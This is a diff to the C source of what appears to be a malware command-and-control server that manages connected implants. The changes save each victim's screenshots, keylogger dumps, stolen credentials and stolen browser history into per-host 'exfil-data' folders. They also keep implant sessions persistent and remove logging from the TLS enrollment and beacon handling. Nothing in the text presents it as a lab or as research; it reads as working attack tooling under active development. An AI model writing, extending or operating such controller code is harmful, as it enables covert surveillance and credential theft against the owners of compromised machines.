@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <sys/socket.h>
+#include <sys/stat.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <unistd.h>
@@ -94,9 +95,13 @@ static int detect_persistence(int *request_id, Conn *conn)
 
 static void display_sessions(void)
 {
-    printf("\n+--------------------------------------------+\n");
-    printf("| %-44s |\n", "C2 Controller — Connected Implants");
-    printf("+--------------------------------------------+\n");
+    printf("\n+------------------------------------------------------------------+\n");
+    printf("| %-64s |\n", "C2 Controller — Connected Implants");
+    printf("+------------------------------------------------------------------+\n");
+    printf("  %-4s  %-16s  %-28s  %-11s\n",
+           "ID", "IP Address", "OS | Hostname", "Persistence");
+    printf("  %-4s  %-16s  %-28s  %-11s\n",
+           "----", "----------------", "----------------------------", "-----------");
 
     pthread_mutex_lock(&g_lock);
     int count = 0;
@@ -104,10 +109,10 @@ static void display_sessions(void)
         if (!g_sessions[i].alive) continue;
         count++;
         const char *pers =
-            g_sessions[i].persistence == PERSISTENCE_ENABLED  ? "PERSIST:ON " :
-            g_sessions[i].persistence == PERSISTENCE_DISABLED ? "PERSIST:OFF" :
-                                                                "PERSIST:?  ";
-        printf("  [%d] %-16s  %-30.30s  %s\n",
+            g_sessions[i].persistence == PERSISTENCE_ENABLED  ? "ENABLED    " :
+            g_sessions[i].persistence == PERSISTENCE_DISABLED ? "DISABLED   " :
+                                                                "UNKNOWN    ";
+        printf("  [%d]  %-16s  %-28.28s  %s\n",
                i + 1,
                g_sessions[i].remote_ip,
                g_sessions[i].os_info,
@@ -118,7 +123,7 @@ static void display_sessions(void)
     if (count == 0)
         printf("  <No implants connected — waiting for beacon...>\n");
 
-    printf("  [0] Refresh\n");
+    printf("\n  [0] Refresh\n");
     printf("Select implant> ");
     fflush(stdout);
 }
@@ -229,16 +234,24 @@ static void run_command_loop(int slot)
     Session *s    = &g_sessions[slot];
     Conn    *conn = s->conn;
     int connected = 1;
+    int back      = 0;
 
-    printf("\n<Entering command loop for implant [%d] %s>\n\n",
-           slot + 1, s->remote_ip);
-    fflush(stdout);
+    /* Build per-implant exfil directory: exfil-data/<hostname>-<ip>
+     * os_info format: "Windows 6.2 | DESKTOP-ABC123"
+     * Extract everything after " | " as the hostname; fall back to ip only. */
+    char save_dir[512];
+    const char *pipe_pos = strstr(s->os_info, " | ");
+    const char *hostname = pipe_pos ? pipe_pos + 3 : s->remote_ip;
+    snprintf(save_dir, sizeof(save_dir), "exfil-data/%s-%s", hostname, s->remote_ip);
+    ensure_save_dir(save_dir);
 
     while (connected) {
         int choice = console_input(s->persistence);
 
-        if (choice == 0)  /* back to session list */
+        if (choice == 0) { /* back to session list — keep session alive */
+            back = 1;
             break;
+        }
 
         switch (choice) {
 
@@ -356,7 +369,7 @@ static void run_command_loop(int slot)
             send_packet(&pkt, conn);
             Packet *resp = recieve_packet(conn);
             if (resp && resp->command_type == COMMAND_RESPONSE)
-                handle_screenshot_response(resp);
+                handle_screenshot_response(resp, save_dir);
             else if (process_response(resp, s->request_id, conn) == -1)
                 connected = 0;
             if (resp) free_packet(resp);
@@ -399,7 +412,7 @@ static void run_command_loop(int slot)
             send_packet(&pkt, conn);
             Packet *resp = recieve_packet(conn);
             if (resp && resp->command_type == COMMAND_RESPONSE)
-                handle_keylog_dump_response(resp);
+                handle_keylog_dump_response(resp, save_dir);
             else if (process_response(resp, s->request_id, conn) == -1)
                 connected = 0;
             if (resp) free_packet(resp);
@@ -414,7 +427,7 @@ static void run_command_loop(int slot)
             send_packet(&pkt, conn);
             Packet *resp = recieve_packet(conn);
             if (resp && resp->command_type == COMMAND_RESPONSE)
-                handle_cred_steal_response(resp);
+                handle_cred_steal_response(resp, save_dir);
             else if (process_response(resp, s->request_id, conn) == -1)
                 connected = 0;
             if (resp) free_packet(resp);
@@ -429,7 +442,7 @@ static void run_command_loop(int slot)
             send_packet(&pkt, conn);
             Packet *resp = recieve_packet(conn);
             if (resp && resp->command_type == COMMAND_RESPONSE)
-                handle_history_steal_response(resp);
+                handle_history_steal_response(resp, save_dir);
             else if (process_response(resp, s->request_id, conn) == -1)
                 connected = 0;
             if (resp) free_packet(resp);
@@ -441,15 +454,15 @@ static void run_command_loop(int slot)
         }
     }
 
-    /* Release the session slot */
-    pthread_mutex_lock(&g_lock);
-    tls_conn_free(conn);
-    s->conn  = NULL;
-    s->alive = 0;
-    pthread_mutex_unlock(&g_lock);
-
-    printf("\n<Session [%d] ended — returning to implant list.>\n\n", slot + 1);
-    fflush(stdout);
+    /* On a real disconnect (SET_SLEEP, SHUTDOWN, lost connection) free the slot.
+     * On BACK the session stays alive — do nothing. */
+    if (!back) {
+        pthread_mutex_lock(&g_lock);
+        tls_conn_free(conn);
+        s->conn  = NULL;
+        s->alive = 0;
+        pthread_mutex_unlock(&g_lock);
+    }
 }
 
 /* ── Acceptor thread: accept → TLS → enroll/HELLO → add session ──────── */
@@ -462,36 +475,19 @@ static void *acceptor_thread(void *arg)
         struct sockaddr_in ca;
         socklen_t cl = sizeof(ca);
         int raw_fd = accept(g_server_fd, (struct sockaddr *)&ca, &cl);
-        if (raw_fd < 0) { perror("accept"); continue; }
+        if (raw_fd < 0) continue;
 
         char ip[INET_ADDRSTRLEN];
         strncpy(ip, inet_ntoa(ca.sin_addr), sizeof(ip) - 1);
         ip[sizeof(ip) - 1] = '\0';
 
-        printf("\n<TCP connection from %s — performing TLS handshake...>\n\n", ip);
-        fflush(stdout);
-
         Conn *conn = tls_server_wrap(raw_fd);
-        if (conn == NULL) {
-            printf("<TLS handshake failed — dropping connection from %s>\n\n", ip);
-            fflush(stdout);
-            close(raw_fd);
-            continue;
-        }
+        if (conn == NULL) { close(raw_fd); continue; }
 
         /* ── Enrollment path (no client cert) ──────────────────────── */
         if (!tls_has_client_cert(conn)) {
-            pthread_mutex_lock(&g_lock);
-            int used = g_token_used;
-            pthread_mutex_unlock(&g_lock);
-
-            if (used)
-                printf("<Enrollment: token consumed — allowing re-enrollment>\n\n");
-
             Packet *pkt = recieve_packet(conn);
             if (!pkt || pkt->command_type != COMMAND_ENROLL_CSR) {
-                printf("<Enrollment rejected — expected ENROLL_CSR packet>\n\n");
-                fflush(stdout);
                 if (pkt) free_packet(pkt);
                 tls_conn_free(conn);
                 continue;
@@ -513,19 +509,13 @@ static void *acceptor_thread(void *arg)
                 Packet resp = {COMMAND_ENROLL_CERT, 0, cert_len, cert_pem};
                 send_packet(&resp, conn);
                 free(cert_pem);
-                printf("<Enrollment OK — cert issued, token consumed>\n\n");
-            } else {
-                printf("<Enrollment failed — CSR validation error>\n\n");
             }
-            fflush(stdout);
             tls_conn_free(conn);
             continue;
         }
 
         /* ── Whitelist check ────────────────────────────────────────── */
         if (!tls_whitelist_check(conn, TLS_WHITELIST)) {
-            printf("<Implant cert not in whitelist — rejecting %s>\n\n", ip);
-            fflush(stdout);
             tls_conn_free(conn);
             continue;
         }
@@ -533,8 +523,6 @@ static void *acceptor_thread(void *arg)
         /* ── HELLO ──────────────────────────────────────────────────── */
         Packet *hello = recieve_packet(conn);
         if (hello == NULL || hello->command_type != COMMAND_HELLO) {
-            printf("<Expected HELLO from %s — dropping>\n\n", ip);
-            fflush(stdout);
             if (hello) free_packet(hello);
             tls_conn_free(conn);
             continue;
@@ -567,15 +555,8 @@ static void *acceptor_thread(void *arg)
         }
         pthread_mutex_unlock(&g_lock);
 
-        if (slot < 0) {
-            printf("<Session table full (%d max) — dropping implant from %s>\n\n",
-                   MAX_IMPLANTS, ip);
+        if (slot < 0)
             tls_conn_free(conn);
-        } else {
-            printf("<Implant [%d] ready — %s  |  %s>\n\n",
-                   slot + 1, ip, os_info);
-        }
-        fflush(stdout);
     }
     return NULL;
 }
